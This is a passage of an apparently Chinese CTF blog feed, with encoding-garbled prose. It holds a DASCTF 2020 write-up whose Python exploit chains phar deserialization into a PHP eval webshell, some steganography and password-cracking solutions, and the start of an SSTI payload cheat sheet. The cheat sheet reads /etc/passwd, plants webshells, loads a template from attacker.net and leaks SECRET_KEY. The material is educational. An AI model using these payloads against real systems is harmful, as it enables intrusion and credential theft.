variable">$</span><span class="token punctuation">&#123;</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"error suffix"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/var/www/html/uploads/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">suffix</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your html file is in "</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'test.txt'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°<code>content</code>ä¸º<code>gyycoming</code>ï¼Œä¹‹åå˜é‡è¦†ç›–<code>gyycoming</code>ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œç”Ÿæˆ.phpæ–‡ä»¶ï¼Œå³å¯æˆåŠŸgetshell</p><p>è¿˜æœ‰æ›´å¥½çš„æ–¹æ³•ï¼Œç›´æ¥<code>content</code>ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œ<code>pattern</code>ç›´æ¥åˆ æ‰ï¼Œæ—¢ç„¶å¯ä»¥pharååºåˆ—åŒ–ï¼Œå°±æœ‰å¾ˆå¤šå§¿åŠ¿äº†ã€‚</p><p>é¦–å…ˆç”¨<code>php://input</code>ä¼ªåè®®ä¸Šä¼ pharæ–‡ä»¶ã€‚</p><p><code>./tp=1&amp;var[template][1]=php://input</code>ï¼ŒPOSTä¸Šä¼ phar</p><p>ç„¶åè§¦å‘pharæ–‡ä»¶ï¼Œåˆ©ç”¨<code>phar://</code>ä¼ªåè®®</p><p><code>./?var[template][1]=phar://&quot;+&lt;url_path&gt;+&quot;&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?&gt;</code></p><img src="/article/dasctf2020/image-20201228193214814.png" class="" title="image-20201228193214814" loading="lazy"><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ˜¯æ­£å¸¸çš„æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªæ˜¯è§¦å‘pharååºåˆ—åŒ–å†™å…¥çš„.phpæ–‡ä»¶ï¼Œèšå‰‘è¿ä¸Šï¼Œåˆ°æ ¹ç›®å½•æ‰§è¡Œ<code>/readflag</code>å³å¯ã€‚</p><img src="/article/dasctf2020/image-20201228193429000.png" class="" title="image-20201228193429000" loading="lazy"><p>æ‰€ä»¥ç›´æ¥è¯»æ˜¯ä¸å¯ä»¥çš„ï¼Œ<code>400</code>æ²¡æœ‰æƒé™ï¼Œéœ€è¦æ‰§è¡Œ<code>/readflag</code>ã€‚</p><p>æœ€åé™„ä¸Šexp</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2020/12/25 14:24@Auth ï¼š gyy@Blogï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> osbaseurl <span class="token operator">=</span> <span class="token string">"http://8.129.41.25:10305/"</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?phpclass Template&#123;    public $content;    public $pattern;    public $suffix;    public function __construct()&#123;        $this->content = "&#123;&#123;gyycoming&#125;&#125;";        $this->pattern = "/&#123;&#123;([a-z]+)&#125;&#125;/";        $this->suffix = ".php";    &#125;    public function __destruct() &#123;        $this->render();    &#125;    public function render() &#123;        while (True) &#123;            if(preg_match($this->pattern, $this->content, $matches)!==1)                break;            global $&#123;$matches[1]&#125;;            if(isset($&#123;$matches[1]&#125;)) &#123;                $this->content = preg_replace($this->pattern, $&#123;$matches[1]&#125;, $this->content);            &#125;            else&#123;                break;            &#125;        &#125;        if(strlen($this->suffix)>5) &#123;            echo "error suffix";            die();        &#125;        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . "/" . md5($this->content) . $this->suffix;        file_put_contents($filename, $this->content);        echo "Your html file is in " . $filename;    &#125;&#125;$phar = new Phar('phar.phar');$phar -> stopBuffering();$phar -> setStub('&lt;?php __HALT_COMPILER();?>');$phar -> addFromString('test.txt','test');$object = new Template();$phar -> setMetadata($object);$phar -> stopBuffering();?>'''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'phar.php'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>php<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.php is create'</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'php phar.php'</span><span class="token punctuation">)</span>    a<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] file phar.phar is create'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] create phar file wrong."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">up_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?tp=1&amp;var[template][1]=php://input"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        pharfile <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pharfile<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"upload file to ----> "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"/var/www/html/"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        upurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token builtin">str</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] upload pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar_trigger</span><span class="token punctuation">(</span>upurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?var[template][1]=phar://"</span><span class="token operator">+</span>upurl<span class="token operator">+</span><span class="token string">"&amp;tp=1&amp;var[gyycoming]=&lt;?php eval($_POST[gyy]);?>"</span>    res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res1<span class="token punctuation">)</span>    <span class="token builtin">str</span> <span class="token operator">=</span> res1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"in "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"shell file ----> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">".php"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        shellurl <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        res2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellurl<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span>        <span class="token keyword">if</span> res2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] success!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> shellurl    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-] trigger pharfile error."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"gyy"</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"system('/readflag');"</span>    phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    upurl <span class="token operator">=</span> up_phar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shellurl <span class="token operator">=</span> phar_trigger<span class="token punctuation">(</span>upurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"********************"</span><span class="token punctuation">)</span>    shell<span class="token punctuation">(</span>shellurl<span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><hr><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><hr><h4 id="é©¬è€å¸ˆçš„ç§˜ç±"><a href="#é©¬è€å¸ˆçš„ç§˜ç±" class="headerlink" title="é©¬è€å¸ˆçš„ç§˜ç±"></a>é©¬è€å¸ˆçš„ç§˜ç±</h4><p>ç­¾åˆ°é¢˜</p><img src="/article/dasctf2020/image-20201228193732975.png" class="" title="image-20201228193732975" loading="lazy"><p>é¦–å…ˆæ‹¿åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œéšä¾¿æ‰«äº†ä¸€ä¸ªï¼Œç«Ÿç„¶æ˜¯æ‹›å¼åç§°â€¦ä¸è¿‡æ—¢ç„¶æ˜¯é¢˜ç›®ï¼Œå›¾ç‰‡è‚¯å®šä¸æ­¢æ˜¯å›¾ç‰‡â€¦ç”¨åå…­è¿›åˆ¶æŸ¥çœ‹ï¼Œåº•éƒ¨å‘ç°äº†zipæ ‡å¿—å¤´<code>50 4D 03 04</code></p><img src="/article/dasctf2020/image-20201228193923701.png" class="" title="image-20201228193923701" loading="lazy"><p>ç”¨foremostæå‰æˆ–è€…ç›´æ¥æ‹–åˆ°æœ€åæ–°å»ºåå…­è¿›åˆ¶æ–‡ä»¶æå‡ºæ¥ï¼Œæ˜¯ä¸ªå‹ç¼©åŒ…</p><img src="/article/dasctf2020/image-20201228194027067.png" class="" title="image-20201228194027067" loading="lazy"><p>æœ‰åŠ å¯†ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¼ªåŠ å¯†ï¼Œç›´æ¥ä¿®æ”¹åŠ å¯†ä½æ‹–å‡ºæ¥jpgæ–‡ä»¶ï¼Œå…¶ä»–ä¸¤ä¸ªæ˜¯çœŸåŠ å¯†</p><img src="/article/dasctf2020/image-20201228194144848.png" class="" title="image-20201228194144848" loading="lazy"><p>å›¾ç‰‡å¾ˆèŠ±ï¼Œä¸è¿‡ä¾ç¨€èƒ½çœ‹å‡ºæ¥ä¸œè¥¿çš„</p><img src="/article/dasctf2020/image-20201228194307542.png" class="" title="image-20201228194307542" loading="lazy"><p>æ‰€ä»¥åˆ©ç”¨Stegsolveï¼ŒæŠŠè¿™å¼ å’ŒåŸå›¾å¼‚æˆ–ä¸€ä¸‹å³å¯</p><img src="/article/dasctf2020/image-20201228194456072.png" class="" title="image-20201228194456072" loading="lazy"><p><code>md5(NianQingRenBuJiangWuDe)</code></p><p>é‚£è¿™ä¸²å»è§£å¯†çœŸåŠ å¯†æ–‡ä»¶<code>c57988283c92f759585a0c1aebfdd743</code>ï¼Œå¯†ç æ­£ç¡®ã€‚</p><p>è¿™é‡Œæœ‰äººè¯´æ˜æ–‡æ”»å‡»ä¹Ÿè¡Œâ€¦æ²¡è·‘è¿‡ï¼Œå¤§æ¦‚å¯ä»¥å§ã€‚</p><p>æ–‡æœ¬æ–‡ä»¶é‡Œä¸€å †<code>å·¦æ­£è¹¬ å³é­è…¿ å·¦åˆºæ‹³</code>ï¼Œç¬¬äºŒä¸ªé‡Œé¢</p><pre class="language-none"><code class="language-none">å·¦æ­£è¹¬ -&gt; .å³é­è…¿ -&gt; !å·¦åˆºæ‹³ -&gt; ?</code></pre><p>å¾ˆæ˜¾ç„¶ï¼Œæ›¿æ¢ã€‚æ›¿æ¢å®Œååªæœ‰<code>.!?</code>ï¼Œæ¨æµ‹ä¸ºOok!åŠ å¯†ï¼Œç›´æ¥å»è§£ï¼Œå¾—åˆ°flag</p><img src="/article/dasctf2020/image-20201228195508111.png" class="" title="image-20201228195508111" loading="lazy"><hr><h4 id="FakePic"><a href="#FakePic" class="headerlink" title="FakePic"></a>FakePic</h4><p>RARå‹ç¼©åŒ…æ³¨é‡Šæç¤ºå¯†ç ä¸º1???å°å†™å­—æ¯ï¼Œå…±å››ä½</p><img src="/article/dasctf2020/image-20201228195736671.png" class="" title="image-20201228195736671" loading="lazy"><p>è¾“å‡ºä¸ªå­—å…¸ç”¨ARPAå‡†å¤‡è·‘ï¼Œç»“æœæç¤ºè¿™ä¸æ˜¯ä¸ªRARæ–‡ä»¶ï¼Œåˆ™ä¸ºRAR5æ ¼å¼ï¼Œåˆ©ç”¨hashcatç ´è§£ï¼Œå¾—åˆ°å¯†ç <code>1cpp</code></p><p>è§£å‹åä¸€ä¸ªå›¾ç‰‡ä¸€ä¸ªæç¤º</p><pre class="language-none"><code class="language-none">10132430å–æœ€å‰é¢500ä½å°±è¡Œ</code></pre><p>Stegsolveåˆ†æä¸€æ³¢æ— æœï¼Œæç¤ºä¹Ÿä¸€å¤´é›¾æ°´ã€‚æœ€ååœ¨åå…­è¿›åˆ¶æŸ¥çœ‹åœ¨æ–‡ä»¶æœ«å°¾æ—¶å‘ç°æç¤º</p><img src="/article/dasctf2020/image-20201228195943508.png" class="" title="image-20201228195943508" loading="lazy"><p>åˆ†æåˆ°è¿™æ²¡åšäº†ï¼Œç”µè„‘æœ‰é—®é¢˜æ²¡è£…ä¸ŠPILæ¨¡å—ã€‚</p><p>èµ›åå‚è€ƒ<a href="https://l1near.top/index.php/2020/12/27/87.html">å¤§å¸ˆå‚…åšå®¢</a>ï¼Œåˆ©ç”¨è„šæœ¬è·‘å‡ºAlphaé€šé“å‰å‡ ä¸ªç‚¹ï¼Œå‘ç°</p><img src="/article/dasctf2020/image-20201228203355447.png" class="" title="image-20201228203355447" loading="lazy"><p> éƒ½æ˜¯2çš„å€æ•°ï¼Œä¸”å€æ•°éƒ½ä¸å¤§ã€‚ç»“åˆå‰é¢çš„æç¤ºï¼ˆè€Œä¸”æç¤ºçš„é•¿åº¦è¿˜ä¸º8ï¼‰ã€‚é‚£ä¹ˆå°±çŒœæµ‹æç¤ºçš„ä½œç”¨æ˜¯è¿™æ ·çš„ï¼š<code>10132430</code>å¾—è¿™æ ·åˆ†<code>1 0 1 3 2 4 3 0</code>ï¼Œç„¶åè¿™8ä¸ªä¸ºä¸€è½®ä¸€ç›´å¾ªç¯ã€‚å¦‚æœåˆšå¥½è½®åˆ°è¿™ä¸ªæ•°ï¼Œç®—å‡ºæ¥çš„<code>pow(2,x)</code>å’ŒAlphaé€šé“çš„å€¼ä¸€æ ·ï¼Œé‚£ä¹ˆå°±ä¸º1ï¼Œå¦åˆ™å°±ä¸º0ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepic <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>width<span class="token punctuation">,</span>height <span class="token operator">=</span> pic<span class="token punctuation">.</span>sizeflag <span class="token operator">=</span> <span class="token string">""</span>z <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>i <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> z <span class="token operator">&lt;=</span> <span class="token number">500</span><span class="token punctuation">:</span>            z <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">[</span>z <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> pic<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'1'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token string">'0'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>è·‘å‡ºæ¥<code>0110011001101100011000010110011101011111011010010111001100111010011001100011010100111000001100100110010100111001011000100011001100110001001110010110000101100010011001010011000101100101011001000110011001100100001101110110010001100110001101010011011000110101011001100110010101100011011001100011011001100110001101100110011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p><p>å»äºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå¾—åˆ°flag</p><img src="/article/dasctf2020/image-20201228203737416.png" class="" title="image-20201228203737416" loading="lazy"><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿˜æ˜¯å¤ªèœäº†ï¼Œæœ‰äº›ç‚¹è¿˜æ˜¯æ¯”è¾ƒç”Ÿç–ï¼Œé‡ç‚¹å­¦ä¹ äº†ä¸€æ³¢pharååºåˆ—åŒ–ï¼Œç»§ç»­å­¦ä¹ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTIæ¨¡æ¿æ³¨å…¥</title>
      <link href="article/ssti/"/>
      <url>article/ssti/</url>
      
        <content type="html"><![CDATA[<p>SSTIæ¨¡æ¿æ³¨å…¥</p><a id="more"></a><h1 id="SSTIæ¼æ´"><a href="#SSTIæ¼æ´" class="headerlink" title="SSTIæ¼æ´"></a>SSTIæ¼æ´</h1><h2 id="ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥"><a href="#ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥" class="headerlink" title="ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥"></a>ä»€ä¹ˆæ˜¯æ¨¡æ¿æ³¨å…¥</h2><p> SSTI ï¼ˆæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼‰ä¹Ÿæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸€ä¸ªéå¸¸å¥½çš„ä¾‹å­ï¼Œå‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½å¯èƒ½ä¼šå‡ºç° SSTI çš„é—®é¢˜ï¼ŒSSTI ä¸å±äºä»»ä½•ä¸€ç§è¯­è¨€ï¼Œæ²™ç›’ç»•è¿‡ä¹Ÿä¸æ˜¯ã€‚è¿™ç§æ¨¡æ¿ä¸ä»…å­˜äºPythonä¸­ï¼ŒPHPä¸­ä¹Ÿæœ‰ä¸å°‘æ¨¡æ¿å¼•æ“ã€‚</p><h2 id="æ£€æµ‹æµç¨‹"><a href="#æ£€æµ‹æµç¨‹" class="headerlink" title="æ£€æµ‹æµç¨‹"></a>æ£€æµ‹æµç¨‹</h2><img src="/article/ssti/SSTI%E6%B5%81%E7%A8%8B.png" class="" title="SSTIæµç¨‹" loading="lazy"><p>é¦–å…ˆè¾“å…¥<code>&#123;&#123;7*7&#125;&#125;</code>ï¼Œè¿”å›å€¼ä¸º<code>49</code>åˆ™è¡¨æ˜å­˜åœ¨SSTI</p><p>è¾“å…¥<code>&#123;&#123;system('cat /etc/passwd')&#125;&#125;</code>å¦‚æœè¿”å›å€¼åˆ™è¡¨æ˜ä¸º<strong>Smartyæ¨¡æ¿å¼•æ“</strong></p><p>è¾“å…¥<code>&#123;&#123;7*'7'&#125;&#125;</code>å¦‚æœè¿”å›å€¼æ˜¯<code>49</code>åˆ™ä¸º<strong>Twigæ¨¡æ¿å¼•æ“</strong></p><p>å¦‚æœè¿”å›å€¼æ˜¯<code>7777777</code>åˆ™ä¸º<strong>JinJaæ¨¡æ¿å¼•æ“</strong></p><hr><h2 id="å§¿åŠ¿æ€»ç»“"><a href="#å§¿åŠ¿æ€»ç»“" class="headerlink" title="å§¿åŠ¿æ€»ç»“"></a>å§¿åŠ¿æ€»ç»“</h2><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>payloadï¼š</p><pre class="language-none"><code class="language-none">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;&#123;literal&#125;alert(&#39;xss&#39;);&#123;&#x2F;literal&#125;&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</code></pre><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;etc&#x2F;passwd&quot;)&#125;&#125;&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat &#x2F;etc&#x2F;passwd&quot;) &#125;</code></pre><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h3 id="Jinja"><a href="#Jinja" class="headerlink" title="Jinja"></a>Jinja</h3><p>payload:</p><pre class="language-none"><code class="language-none">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;&#x2F;&#x2F;å†™æ–‡ä»¶&#123;&#123; 